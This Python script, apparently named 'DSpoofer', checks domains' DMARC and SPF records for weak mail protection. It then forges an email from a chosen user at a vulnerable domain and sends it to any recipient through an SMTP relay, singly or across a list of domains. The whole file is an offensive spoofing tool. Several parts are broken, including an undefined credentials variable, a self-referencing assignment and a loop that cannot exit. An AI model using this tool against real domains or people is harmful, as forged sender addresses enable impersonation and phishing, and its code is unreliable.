#!/usr/bin/python3
import os
import argparse
import dns.resolver
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import re
import smtplib
import time
import sys

print("""
______________________________  __/____________
__  ___/__  __ \  __ \  __ \_  /_ _  _ \_  ___/
_(__  )__  /_/ / /_/ / /_/ /  __/ /  __/  /
/____/ _  .___/\____/\____//_/    \___//_/
       /_/
""")


email_subject = "Spoofed!"
message = """

<H1> THIS IS A PROOF OF CONCEPT SPOOF EMAIL </H1>

"""

rel_p = "" # Email Relay Password
username = "" # Email Relay Username
smtphost = "" # smtp-endpoint:port (i.e. smtp-relay.sendinblue.com:587)


parser = argparse.ArgumentParser(description='DSpoofer - Check if a list of domains or single domain is spoofable and then send a proof of concept email')
parser.add_argument('--domain', help='Domain name to test')
parser.add_argument('--file', help='Text file with domains')
#parser.add_argument('selector', help='DKIM Selector, can be extracted from email')
    # print(args)
args = parser.parse_args()

domain = args.domain
domain_file = args.file

if domain and domain_file:
    parser.print_help()
    sys.exit(0)
elif domain and not domain_file:
    print("Checking domain: " + domain)
elif domain_file and not domain:
    print("Reading file: " + domain_file)
else:
    parser.print_help()
    sys.exit(0)



def CHECK_IF_SPOOFABLE(domain):
    ctr = 0
    _DMARC_RES = 0
    _SPF_RES = 0
    print(f"------- {domain} -------")
    _DMARC = "> 1/2 DMARC Check: "
    _SPF = "> 2/2 SPF Check: "
    try:
      test_dmarc = dns.resolver.resolve('_dmarc.' + domain , 'TXT')
      for dns_data in test_dmarc:
        if 'DMARC1' in str(dns_data):
          print (_DMARC + "  [PASS] DMARC record found :",dns_data)
          if "p=reject" in str(dns_data):
              _DMARC_RES += 2
          elif "p=quarantine" in str(dns_data):
              _DMARC_RES += 1
          elif "p=none" in str(dns_data):
              _DMARC_RES += 0


    except:
      print (_DMARC + "  [FAIL] DMARC record not found.")
      ctr += 1
      pass

    try:
        test_spf = dns.resolver.resolve(domain , 'TXT')
        spf_counter1 = 0
        spf_counter2 = 0
        for dns_data in test_spf:
            if 'spf1' in str(dns_data):
                print (_SPF + "  [PASS] SPF record found   :",dns_data)
                spf_counter1 += 1
            else:
                spf_counter2 += 1
        if not spf_counter1:
            print(_SPF + f"{spf_counter2} Records found, but no spf1 control found")

    except:
      print (_SPF + "  [FAIL] SPF record not found.")
      _SPF_RES += 1

      pass
    return ctr, _DMARC_RES, _SPF_RES



def check_email_valid(email):
    regex = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
    if(re.fullmatch(regex, email)):
        return 0
    else:
        print(f"[x] Invalid email: {email}")
        return 1

def _prepare_args(domain):
    while True:
        user = input("> user to be spoofed (Do not include @domain.com): ")
        if "@" in user:
            print("! Only user. i.e. marketing")
        else:
            break
    from_send = user + "@" + domain
    try:
        to_send = to_send
    except:
        to_send = input("> Send spoofed email to: ")
    while True:
        if check_email_valid(to_send):
            invalid_to_send = f"[x] Invalid email: {to_send}"
            invalid_to += 1
        else:
            break
    SAVE_EMAIL = input(" - Save Email? y/n: ")
    if SAVE_EMAIL.lower == "y":
        send_email_to += to_send

    # Checar argumentos:
    invalid_from = 0
    invalid_to = 1
    invalid_from_send = ""
    invalid_to_send = ""
    if invalid_from:
        print(invalid_from_send)
    if invalid_to:
        print(invalid_to_send)
    if invalid_from_send != "" or invalid_to_send != "":
        print("XX")
        exit(1)
    while True:
        confirmation_msg = f"> From {from_send}, to {to_send}\n[!] Confirm (y): "
        confirmation = input(confirmation_msg)
        if confirmation.lower() == "n":
            return from_send, to_send, 0
        elif confirmation == "Y":
            return from_send, to_send, 1
        else:
            continue

def _prepare_email(message, remitente, destinatario, asunto):
    msg = MIMEMultipart()
    msg['From'] = str(remitente)
    msg['To'] = str(destinatario)
    msg['Subject'] = email_subject
    msg.attach(MIMEText(message, 'plain'))
    return msg

def _sendmail(msg,creds):
    try:
        time.sleep(1)
        print("[i] OK")
        time.sleep(1)
        print(f"[i] Sending email:")
        time.sleep(0.5)
        print(f"\tfrom \t{remitente}\n\tto\t{destinatario}\n")
        rel_p = creds[1]
        username = creds[0]
        smtphost = creds[2]
        server = smtplib.SMTP(smtphost)
        server.starttls()
        server.login(username, rel_p)
        server.sendmail(msg['From'], msg['To'], msg.as_string())
        server.quit()
        print("[+] Successfully sent email message to %s:" % (msg['To']))
    except Exception as e:
        print("[-] Error sending mail:")
        print(e)



def _CONTROL(CTR,DMARC,SPF):
    if CTR > 0:
        while True:
            confirmation = input("[+] SPOOFABLE. SPOOF? Y/N: ")
            if confirmation == "N":
                print("X Aborted by user...")
                return 0
            if confirmation == "n":
                print("X Aborted by user...")
                return 0
            elif confirmation == "Y":
                return 1
            else:
                continue
    else:
        if DMARC == 0:
            CHECK = "[i] May be spoofable."
        elif DMARC == 1:
            CHECK = "May get to spam"
        elif DMARC == 2:
            if SPF:
                CHECK = "May be rejected: DMARC fails compliance but no SPF found"
            else:
                print("[-] Not spoofable: Will be rejected")
                return 0
        print("[-] SPOOFABLE: " + CHECK)
        while True:
            confirmation = input(" - Spoof? Y/N")
            #if DMARC == 0:
            if confirmation == "N":
                print("X Aborted by user...")
                return 0
            if confirmation == "n":
                print("X Aborted by user...")
                return 0
            elif confirmation == "Y":
                print("[i] Continuing...")
                return 1
            else:
                continue

send_email_to = ""

if domain:
    CTR,DMARC,SPF = CHECK_IF_SPOOFABLE(domain)
    if _CONTROL(CTR, DMARC, SPF):
        remitente, destinatario, confirm = _prepare_args(domain)
        if confirm:
            msg = _prepare_email(message, remitente, destinatario, email_subject)
            sendemail = _sendmail(msg,creds)
        else:
            print("X Aborted by user")

elif domain_file:
    domains = []
    with open(domain_file, 'r') as domain_f:
        if domain_f.readable():
            print("[+] Will be spoofed:")
            for Domain in domain_f.readlines():
                print(Domain, end="")
                domains.append(Domain.replace("\n",""))
        else:
            print("CAn't read file")
            sys.exit(1)

        for Domain in domains:
            CTR,DMARC,SPF = CHECK_IF_SPOOFABLE(Domain)
            if _CONTROL(CTR, DMARC, SPF):
                remitente, destinatario, confirm = _prepare_args(Domain)
                if confirm:
                    msg = _prepare_email(message, remitente, destinatario, email_subject)
                    sendemail = _sendmail(msg,creds)
                else:
                    print("X Aborted by user")
                    continue
